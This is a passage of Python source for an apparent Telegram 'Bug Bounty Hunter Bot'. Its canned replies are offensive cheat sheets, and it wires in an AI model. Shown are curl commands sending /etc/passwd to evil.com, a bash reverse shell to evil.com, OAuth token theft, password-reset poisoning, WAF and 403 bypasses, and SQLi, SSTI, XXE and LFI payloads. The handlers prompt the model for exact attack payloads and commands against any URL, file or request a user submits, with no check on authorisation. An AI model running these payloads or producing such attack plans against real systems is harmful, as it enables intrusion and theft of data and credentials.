        "```\n; curl http://YOUR.interactsh.com/$(id|base64)\n; curl \"http://evil.com/?data=$(cat /etc/passwd|base64)\"\n```\n\n"
        "*Reverse Shell:*\n"
        "```\n; bash -c 'bash -i >& /dev/tcp/evil.com/4444 0>&1'\n$(python3 -c 'import socket,subprocess;...')\n```\n\n"
        "*Filter Bypass:*\n"
        "```\n${IFS}id    # Space bypass\nw'h'o'am'i  # Quote bypass\n/bin/c'a't /etc/passwd\n```\n\n"
        "*Where to Find:*\n"
        "```\nPing/traceroute tools\nDNS lookup features\nImage processing\nReport generators\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def redirect_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "↪️ *Open Redirect*\n\n"
        "*Parameters to Test:*\n"
        "```\n?redirect= ?next= ?url= ?goto=\n?return= ?returnUrl= ?continue=\n?dest= ?destination= ?redir=\n```\n\n"
        "*Basic Payloads:*\n"
        "```\n?redirect=https://evil.com\n?next=//evil.com\n?url=https://evil.com/\n```\n\n"
        "*Filter Bypass:*\n"
        "```\nhttps://target.com.evil.com\nhttps://evil.com?target.com\nhttps://evil.com#target.com\nhttps://target.com@evil.com\n%68%74%74%70%73%3A%2F%2Fevil.com\n```\n\n"
        "*Chain to OAuth ATO:*\n"
        "```\n1. Find open redirect on target.com\n2. OAuth: redirect_uri=target.com/redirect?url=evil.com\n3. Victim auth → token sent to evil.com\n```\n\n"
        "*XSS via Redirect:*\n"
        "```\n?redirect=javascript:alert(1)\n?redirect=data:text/html,<script>alert(1)</script>\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def hostheader_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🏠 *Host Header Injection*\n\n"
        "*Password Reset Poisoning:*\n"
        "```http\nPOST /forgot-password HTTP/1.1\nHost: evil.com\n\n# Reset link goes to evil.com!\n# Victim clicks → token stolen\n```\n\n"
        "*Header Variations:*\n"
        "```\nHost: evil.com\nX-Forwarded-Host: evil.com\nX-Host: evil.com\nX-Forwarded-Server: evil.com\nX-HTTP-Host-Override: evil.com\nForwarded: host=evil.com\n```\n\n"
        "*Cache Poisoning:*\n"
        "```http\nGET / HTTP/1.1\nHost: target.com\nX-Forwarded-Host: evil.com\n# If cached → all users affected!\n```\n\n"
        "*SSRF via Host:*\n"
        "```http\nGET /api/internal HTTP/1.1\nHost: 127.0.0.1\n```\n\n"
        "*PoC Steps:*\n"
        "```\n1. Trigger password reset\n2. Intercept in Burp\n3. Change Host: to attacker.com\n4. Check attacker.com for token\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def massassign_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "📦 *Mass Assignment*\n\n"
        "*Basic Attack:*\n"
        "```json\n// Normal\n{\"name\": \"John\", \"email\": \"john@test.com\"}\n\n// Attack\n{\n  \"name\": \"John\",\n  \"email\": \"john@test.com\",\n  \"role\": \"admin\",\n  \"isAdmin\": true,\n  \"is_verified\": true,\n  \"credits\": 99999,\n  \"plan\": \"enterprise\"\n}\n```\n\n"
        "*Where to Find:*\n"
        "```\nRegistration endpoints\nProfile update\nAPI with JSON body\nAny object update\n```\n\n"
        "*Extra Fields to Try:*\n"
        "```\nrole, isAdmin, is_admin\nadmin, superuser, verified\npermissions, scope, access_level\ncredits, balance, plan\ngroup_id, org_id, account_type\n```\n\n"
        "*PoC:*\n"
        "```\n1. Register normally → role: user\n2. Register with role: admin\n3. Login → check role → admin = vulnerable!\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def subtakeover_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🌐 *Subdomain Takeover*\n\n"
        "*Detection:*\n"
        "```bash\n# Nuclei\nnuclei -l subs.txt -t takeovers/\n\n# subjack\nsubjack -w subs.txt -t 100 -o results.txt\n\n# Manual\ndig CNAME sub.target.com\n# If points to unclaimed service = vulnerable!\n```\n\n"
        "*Vulnerable Fingerprints:*\n"
        "```\nGitHub Pages: 'There isn't a GitHub Pages site here'\nHeroku:       'No such app'\nAWS S3:       'NoSuchBucket'\nShopify:      'Sorry, this shop is currently unavailable'\nFastly:       'Fastly error: unknown domain'\nNetlify:      'Not Found - Request ID'\nSurge.sh:     'project not found'\n```\n\n"
        "*Takeover Process:*\n"
        "```\n1. sub.target.com CNAME → target.github.io\n2. github.com/target → 404 (not claimed)\n3. Create repo: github.com/attacker/target.github.io\n4. Custom domain: sub.target.com\n5. ✅ Takeover complete!\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def bizlogic_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🧠 *Business Logic Vulnerabilities*\n\n"
        "*Price Manipulation:*\n"
        "```json\n{\"price\": 0.01}\n{\"price\": -100}\n{\"quantity\": -1}\n{\"quantity\": 9999999999}\n```\n\n"
        "*Workflow Bypass:*\n"
        "```\n/checkout/step1 (add to cart)\n/checkout/step2 (payment) ← SKIP\n/checkout/step3 (confirm) ← GO HERE\n```\n\n"
        "*Coupon Abuse:*\n"
        "```\nApply same coupon 20x simultaneously\nApply multiple coupons\nNegative discount\n```\n\n"
        "*Plan/Role Manipulation:*\n"
        "```json\n{\"plan\": \"free\"} → {\"plan\": \"enterprise\"}\n{\"user_type\": \"admin\"}\n```\n\n"
        "*Test Checklist:*\n"
        "```\n[ ] Can I pay less than the actual price?\n[ ] Can I skip required steps?\n[ ] Can I apply discounts multiple times?\n[ ] Can I access premium features for free?\n[ ] Can I transfer negative amounts?\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

# ===== TOOLS & METHOD COMMANDS =====

async def tools_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🛠️ *Essential Bug Bounty Tools*\n\n"
        "*Recon:*\n"
        "• subfinder, amass, assetfinder\n"
        "• httpx, naabu, masscan\n"
        "• gowitness, nuclei\n"
        "• gau, waybackurls, katana\n\n"
        "*Web Testing:*\n"
        "• Burp Suite Pro ← الأساس\n"
        "• ffuf, feroxbuster\n"
        "• sqlmap, dalfox\n"
        "• jwt_tool, arjun\n\n"
        "*Burp Extensions:*\n"
        "• Logger++, Autorize\n"
        "• Turbo Intruder, JWT Editor\n"
        "• Param Miner, JS Miner\n"
        "• InQL (GraphQL)\n\n"
        "*JS Analysis:*\n"
        "• LinkFinder, SecretFinder\n"
        "• source-map-explorer\n\n"
        "*Secrets:*\n"
        "• trufflehog, gitleaks\n\n"
        "*Cloud:*\n"
        "• cloud_enum, S3Scanner, Pacu\n\n"
        "*Wordlists:*\n"
        "• SecLists (github.com/danielmiessler/SecLists)\n"
        "• Assetnote (wordlists.assetnote.io)"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def methodology_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🎯 *Bug Bounty Methodology*\n\n"
        "*Order of Operations:*\n\n"
        "*1️⃣ Recon*\n"
        "→ /recon /subdomain /shodan\n\n"
        "*2️⃣ JS Analysis*\n"
        "→ /js (secrets, endpoints, source maps)\n\n"
        "*3️⃣ CVE Scan*\n"
        "```\nnuclei -l alive.txt -t cves/ -t exposures/\n```\n\n"
        "*4️⃣ Walk the App*\n"
        "• Burp Suite captures everything\n"
        "• Build heat map\n\n"
        "*5️⃣ Content Discovery*\n"
        "```\nffuf -u target.com/FUZZ -w wordlist.txt\n```\n\n"
        "*6️⃣ Manual Testing*\n"
        "→ /idor /ssrf /xss /sqli /upload\n\n"
        "*Heat Map 🔥:*\n"
        "🔥🔥🔥 Upload, Admin, API, New Features\n"
        "🔥🔥 Search, Profile, Payment\n"
        "🔥 Static, Marketing"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def waf_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🛡️ *WAF Bypass Techniques*\n\n"
        "*Case Variation:*\n"
        "```\n<ScRiPt>alert(1)</ScRiPt>\nSeLeCt UsErNaMe FrOm UsErS\n```\n\n"
        "*Comments:*\n"
        "```\nSE/**/LECT user/**/name\n<scr<!---->ipt>alert(1)</scr<!---->ipt>\n```\n\n"
        "*Encoding:*\n"
        "```\n%3Cscript%3Ealert(1)%3C/script%3E\n%253Cscript%253E (double encode)\n&#x3C;script&#x3E;\n```\n\n"
        "*SQLi Bypass:*\n"
        "```sql\n/*!SELECT*/ username /*!FROM*/ users\nSELECT(username)FROM(users)\nSELECT%09username%09FROM%09users\n```\n\n"
        "*XSS Bypass:*\n"
        "```\n<img src=x onerror=alert`1`>\n<svg><animate onbegin=alert(1) attributeName=x>\n<details open ontoggle=alert(1)>\n```\n\n"
        "*sqlmap Tampers:*\n"
        "```\nsqlmap --tamper=space2comment,between,randomcase\nsqlmap --tamper=charunicodeescape,between\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def bypass403_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "🔓 *403 Bypass Techniques*\n\n"
        "*Header Bypass:*\n"
        "```\nX-Original-URL: /admin\nX-Rewrite-URL: /admin\nX-Custom-IP-Authorization: 127.0.0.1\nX-Forwarded-For: 127.0.0.1\nX-Forward-For: 127.0.0.1\nX-Remote-IP: 127.0.0.1\nX-Client-IP: 127.0.0.1\n```\n\n"
        "*Path Manipulation:*\n"
        "```\n/admin/../admin\n/ADMIN\n/admin/\n/admin;/\n/admin/.\n/./admin\n/%2fadmin\n/admin%20\n/admin%09\n/admin..;/\n```\n\n"
        "*Method Change:*\n"
        "```\nGET /admin → POST /admin\nGET /admin → HEAD /admin\nGET /admin → OPTIONS /admin\n```\n\n"
        "*Nuclei 403 Bypass:*\n"
        "```\nnuclei -u https://target.com/admin -t misconfiguration/403-bypass.yaml\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def chains_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "⛓️ *Attack Chains*\n\n"
        "*SSRF → AWS Keys → Cloud Takeover:*\n"
        "```\nSSRF → metadata.aws → IAM keys → aws s3 ls\n```\n\n"
        "*Open Redirect → OAuth Token Theft:*\n"
        "```\nFind OAuth → find open redirect\nredirect_uri=target.com/redir?url=evil.com\nVictim auth → token to evil.com\n```\n\n"
        "*XSS → Admin Takeover:*\n"
        "```\nStored XSS → admin views → steal cookie\nUse cookie → admin account\n```\n\n"
        "*LFI → RCE:*\n"
        "```\nLFI → log poisoning → include log → RCE\n```\n\n"
        "*Subdomain Takeover → XSS:*\n"
        "```\nDangling CNAME → claim service\nHost XSS payload → fires on target context\n```\n\n"
        "*Mass Assignment → Admin:*\n"
        "```\nRegister + role:admin → login as admin\n```\n\n"
        "*IDOR → Full Data Breach:*\n"
        "```\nIDOR in /api/users/ID → enumerate all IDs\nDump all user data\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def report_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "📝 *Bug Bounty Report Template*\n\n"
        "*Title:*\n"
        "`[Vuln] in [Feature] allows [Impact]`\n\n"
        "*Severity:* Critical/High/Medium/Low\n\n"
        "*CVSS Score:* (calculate at cvss.io)\n\n"
        "*Summary:*\n"
        "وصف مختصر للثغرة وتأثيرها\n\n"
        "*Steps to Reproduce:*\n"
        "1. Navigate to...\n"
        "2. Send request...\n"
        "3. Observe that...\n\n"
        "*Impact:*\n"
        "ماذا يستطيع المهاجم فعله؟\n\n"
        "*PoC:*\n"
        "Screenshot / Video / Code\n\n"
        "*Remediation:*\n"
        "كيف يتم الإصلاح؟\n\n"
        "💡 *Tips:*\n"
        "• فيديو PoC = تقرير أقوى\n"
        "• اشرح الـ impact بوضوح\n"
        "• اقترح الإصلاح دائماً\n"
        "• كن محترفاً ومهنياً"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def payloads_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "💣 *Quick Payload Reference*\n\n"
        "*XSS:*\n"
        "```\n<script>alert(1)</script>\n<img src=x onerror=alert(1)>\n<svg onload=alert(1)>\n```\n\n"
        "*SQLi:*\n"
        "```\n' OR 1=1--\n' AND SLEEP(5)--\n' UNION SELECT 1,2,3--\n```\n\n"
        "*SSRF:*\n"
        "```\nhttp://169.254.169.254/latest/meta-data/\nhttp://127.0.0.1:6379/\nhttp://[::1]/\n```\n\n"
        "*LFI:*\n"
        "```\n../../../../etc/passwd\n..%252f..%252fetc/passwd\nphp://filter/convert.base64-encode/resource=index.php\n```\n\n"
        "*SSTI:*\n"
        "```\n{{7*7}}\n${7*7}\n{{config.__class__.__init__.__globals__['os'].popen('id').read()}}\n```\n\n"
        "*XXE:*\n"
        "```xml\n<!DOCTYPE root [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>\n<root>&xxe;</root>\n```\n\n"
        "*CMD:*\n"
        "```\n; id\n| id\n`id`\n$(id)\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

async def checklist_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = (
        "✅ *Bug Bounty Testing Checklist*\n\n"
        "*Authentication:*\n"
        "```\n[ ] Brute force protection\n[ ] Default credentials\n[ ] Password reset poisoning\n[ ] 2FA bypass\n[ ] JWT attacks\n[ ] OAuth misconfig\n```\n\n"
        "*Authorization:*\n"
        "```\n[ ] IDOR on all object IDs\n[ ] Horizontal privilege escalation\n[ ] Vertical privilege escalation\n[ ] MFLAC (missing function level auth)\n[ ] Mass assignment\n```\n\n"
        "*Injection:*\n"
        "```\n[ ] XSS on all inputs\n[ ] SQLi on all DB params\n[ ] SSRF on all URL params\n[ ] XXE on XML inputs\n[ ] SSTI on template fields\n[ ] Command injection\n[ ] LFI on file params\n```\n\n"
        "*Business Logic:*\n"
        "```\n[ ] Price manipulation\n[ ] Workflow bypass\n[ ] Race conditions\n[ ] Coupon abuse\n```\n\n"
        "*Recon:*\n"
        "```\n[ ] Subdomains enumerated\n[ ] JS files analyzed\n[ ] APIs discovered\n[ ] GitHub checked\n[ ] Shodan checked\n[ ] Source maps checked\n```"
    )
    await update.message.reply_text(msg, parse_mode='Markdown')

# ===== MESSAGE HANDLERS =====

async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action="typing")
    try:
        photo = update.message.photo[-1]
        file = await context.bot.get_file(photo.file_id)
        file_bytes = await file.download_as_bytearray()
        image_data = base64.standard_b64encode(bytes(file_bytes)).decode("utf-8")
        caption = update.message.caption or ""
        user_id = update.effective_user.id
        await update.message.reply_text("🔍 جاري تحليل الصورة...")
        client = anthropic.Anthropic(api_key=os.environ.get("ANTHROPIC_API_KEY"))
        response = client.messages.create(
            model="claude-opus-4-5",
            max_tokens=2048,
            system=SYSTEM_PROMPT,
            messages=[{"role": "user", "content": [
                {"type": "image", "source": {"type": "base64", "media_type": "image/jpeg", "data": image_data}},
                {"type": "text", "text": (
                    f"Analyze this screenshot from a bug bounty target.\n"
                    f"Context: {caption}\n\n"
                    f"1. What page/feature is this?\n"
                    f"2. List ALL visible elements and features\n"
                    f"3. Map each feature to attack actions with exact payloads\n"
                    f"4. Prioritize by impact\n"
                    f"5. Give next recon steps\n"
                    f"6. Any exposed secrets or sensitive info visible?"
                )}
            ]}]
        )
        result = response.content[0].text
        add_to_history(user_id, "user", f"[Screenshot] {caption}")
        add_to_history(user_id, "assistant", result)
        await send_long_message(update, result)
    except Exception as e:
        logger.error(f"Photo error: {e}")
        await update.message.reply_text(f"❌ خطأ: {str(e)}")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action="typing")
    try:
        doc = update.message.document
        filename = doc.file_name or "file.txt"
        caption = update.message.caption or ""
        user_id = update.effective_user.id
        if doc.file_size > 5 * 1024 * 1024:
            await update.message.reply_text("❌ الملف كبير جداً (max 5MB)")
            return
        file = await context.bot.get_file(doc.file_id)
        file_bytes = await file.download_as_bytearray()
        await update.message.reply_text(f"📄 جاري تحليل: `{filename}`...", parse_mode='Markdown')
        try:
            file_content = file_bytes.decode('utf-8')
        except UnicodeDecodeError:
            file_content = file_bytes.decode('latin-1')
        if len(file_content) > 8000:
            file_content = file_content[:8000] + "\n\n[... truncated ...]"
        prompt = (
            f"Analyze this file from bug bounty engagement.\n"
            f"Filename: {filename} | Context: {caption}\n\n"
            f"FILE CONTENT:\n{file_content}\n\n"
            f"1. File type and purpose\n"
            f"2. Extract ALL endpoints, params, tokens, API keys\n"
            f"3. Find secrets (api keys, passwords, internal URLs)\n"
            f"4. Build attack surface map\n"
            f"5. Vulnerability patterns\n"
            f"6. Prioritized next steps with exact commands"
        )
        result = await call_claude(user_id, prompt)
        await send_long_message(update, result)
    except Exception as e:
        logger.error(f"Document error: {e}")
        await update.message.reply_text(f"❌ خطأ: {str(e)}")

async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    user_message = update.message.text
    await context.bot.send_chat_action(chat_id=update.effective_chat.id, action="typing")
    try:
        content_type = detect_content_type(user_message)
        url_match = re.search(r'https?://[^\s]+', user_message)
        url = url_match.group(0) if url_match else user_message

        if content_type == "url_js":
            await update.message.reply_text("🔍 JS/Config file detected — تحليل متخصص...")
            prompt = (
                f"Analyze this JS/Config file URL:\n{url}\n\n"
                f"1. IMMEDIATE: curl commands to read file and grep secrets\n"
                f"2. SOURCE MAP: check {url}.map\n"
                f"3. BACKUP FILES: .bak .old .orig .swp ~ variations\n"
                f"4. ALTERNATIVE EXTENSIONS: .json .xml .yaml .env\n"
                f"5. WAYBACK MACHINE: find old versions\n"
                f"6. EXTRACT ENDPOINTS: grep commands for APIs in JS\n"
                f"7. DIRECTORY ENUMERATION: parent dirs to check\n"
                f"8. PATH TRAVERSAL tests\n"
                f"9. SECRETS to grep: api_key token password aws firebase"
            )
        elif content_type == "url":
            await update.message.reply_text("🎯 جاري تحليل الموقع...")
            prompt = (
                f"Analyze this target URL for bug bounty:\n{url}\n\n"
                f"Use the WEBSITE ANALYSIS PROTOCOL:\n"
                f"1. DETECT all features (auth, upload, search, API, payment, admin, forms, etc.)\n"
                f"2. MAP attack actions for each feature with EXACT payloads\n"
                f"3. PRIORITIZE by impact\n"
                f"4. Give IMMEDIATE ACTIONS with exact commands\n"
                f"5. Give RECON COMMANDS specific to this target\n"
                f"6. Give TESTING CHECKLIST\n\n"
                f"Format:\n"
                f"🎯 TARGET: URL\n"
                f"🔍 DETECTED FEATURES:\n"
                f"🔴 CRITICAL: feature → attack\n"
                f"🟠 HIGH: feature → attack\n"
                f"🟡 MEDIUM: feature → attack\n"
                f"⚡ IMMEDIATE ACTIONS:\n"
                f"🛠️ RECON COMMANDS:\n"
                f"📋 CHECKLIST:"
            )
        elif content_type == "http_request":
            await update.message.reply_text("📋 تحليل HTTP Request...")
            prompt = (
                f"Analyze this HTTP request:\n\n{user_message}\n\n"
                f"1. Endpoint and method analysis\n"
                f"2. Auth mechanism (JWT/session/API key) - decode if JWT\n"
                f"3. ALL IDOR opportunities with exact modified requests\n"
                f"4. Injection points with exact payloads\n"
                f"5. Mass assignment - extra fields to add\n"
                f"6. Missing security headers/CSRF\n"
                f"7. Business logic issues\n"
                f"Give EXACT modified requests for each attack. Prioritize by impact."
            )
        else:
            prompt = user_message

        result = await call_claude(user_id, prompt)
        await send_long_message(update, result)
    except Exception as e:
        logger.error(f"Message error: {e}")
        await update.message.reply_text(f"❌ خطأ: {str(e)}")

def main():
    token = os.environ.get("TELEGRAM_BOT_TOKEN")
    if not token:
        raise ValueError("TELEGRAM_BOT_TOKEN environment variable not set!")
    app = Application.builder().token(token).build()

    # General
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("clear", clear_command))

    # Recon
    app.add_handler(CommandHandler("recon", recon_command))
    app.add_handler(CommandHandler("asn", asn_command))
    app.add_handler(CommandHandler("subdomain", subdomain_command))
    app.add_handler(CommandHandler("js", js_command))
    app.add_handler(CommandHandler("wayback", wayback_command))
    app.add_handler(CommandHandler("shodan", shodan_command))
    app.add_handler(CommandHandler("dork", dork_command))
    app.add_handler(CommandHandler("github_recon", github_recon_command))

    # Vulnerabilities
    app.add_handler(CommandHandler("xss", xss_command))
    app.add_handler(CommandHandler("sqli", sqli_command))
    app.add_handler(CommandHandler("idor", idor_command))
    app.add_handler(CommandHandler("ssrf", ssrf_command))
    app.add_handler(CommandHandler("xxe", xxe_command))
    app.add_handler(CommandHandler("lfi", lfi_command))
    app.add_handler(CommandHandler("ssti", ssti_command))
    app.add_handler(CommandHandler("csrf", csrf_command))
    app.add_handler(CommandHandler("jwt", jwt_command))
    app.add_handler(CommandHandler("cors", cors_command))
    app.add_handler(CommandHandler("oauth", oauth_command))
    app.add_handler(CommandHandler("upload", upload_command))
    app.add_handler(CommandHandler("race", race_command))
    app.add_handler(CommandHandler("graphql", graphql_command))
    app.add_handler(CommandHandler("cmdinject", cmdinject_command))
    app.add_handler(CommandHandler("redirect", redirect_command))
    app.add_handler(CommandHandler("hostheader", hostheader_command))
    app.add_handler(CommandHandler("massassign", massassign_command))
    app.add_handler(CommandHandler("subtakeover", subtakeover_command))
    app.add_handler(CommandHandler("bizlogic", bizlogic_command))

    # Tools & Methods
    app.add_handler(CommandHandler("tools", tools_command))
    app.add_handler(CommandHandler("methodology", methodology_command))
    app.add_handler(CommandHandler("waf", waf_command))
    app.add_handler(CommandHandler("403bypass", bypass403_command))
    app.add_handler(CommandHandler("chains", chains_command))
    app.add_handler(CommandHandler("report", report_command))
    app.add_handler(CommandHandler("payloads", payloads_command))
    app.add_handler(CommandHandler("checklist", checklist_command))

    # Media & Text
    app.add_handler(MessageHandler(filters.PHOTO, handle_photo))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))

    logger.info("🚀 Bug Bounty Hunter Bot v7 is running...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
